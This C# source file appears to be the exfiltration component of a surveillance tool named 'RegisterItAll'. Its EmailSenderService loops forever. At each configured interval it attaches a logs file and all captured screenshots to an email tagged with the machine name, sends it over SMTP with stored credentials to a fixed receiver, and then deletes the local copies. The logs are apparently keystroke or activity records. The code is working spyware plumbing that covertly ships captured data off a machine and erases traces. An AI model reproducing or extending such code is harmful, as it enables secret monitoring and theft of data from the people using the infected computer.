using RegisterItAll.Managers;
using RegisterItAll.Services.Base;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace RegisterItAll.Services
{
    public partial class EmailSenderService : ExecutableAsConsoleApplicationService
    {
        private static int DelaySecons = Convert.ToInt32(ConfigurationManager.AppSettings.Get("EmailFrequencyInSeconds"));

        private static string SenderEmailAddress = ConfigurationManager.AppSettings.Get("SenderEmailAddress");
        private static string SenderEmailHost = ConfigurationManager.AppSettings.Get("SenderEmailHost");
        private static string SenderEmailPassword = ConfigurationManager.AppSettings.Get("SenderEmailPassword");
        private static string ReceiverEmailAddress = ConfigurationManager.AppSettings.Get("ReceiverEmailAddress");

        protected override async void OnStart(string[] args)
        {
            while (true)
            {
                await Task.Delay(DelaySecons * 1000);

                try
                {
                    SendEmail();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        private static void SendEmail()
        {
            MailMessage message = new MailMessage()
            {
                From = new MailAddress(SenderEmailAddress, displayName: null, Encoding.UTF8),
                Subject = $"RegisterItAll ({Environment.MachineName})",
                SubjectEncoding = Encoding.UTF8,
            };

            message.To.Add(ReceiverEmailAddress);

            string logsFile = FilesManager.GetLogsFile();
            message.Attachments.Add(new Attachment(logsFile));

            IEnumerable<string> screenshots = FilesManager.GetScreenshots();
            foreach (string screenshot in screenshots)
            {
                message.Attachments.Add(new Attachment(screenshot));
            }

            SmtpClient client = new SmtpClient()
            {
                Credentials = new NetworkCredential(SenderEmailAddress, SenderEmailPassword),
                Host = SenderEmailHost,
                Port = 587,
                EnableSsl = true,
            };

            client.Send(message);

            message.Dispose();
            client.Dispose();

            FilesManager.RemoveLogsFile(logsFile);
            FilesManager.RemoveScreenshots(screenshots);
        }
    }
}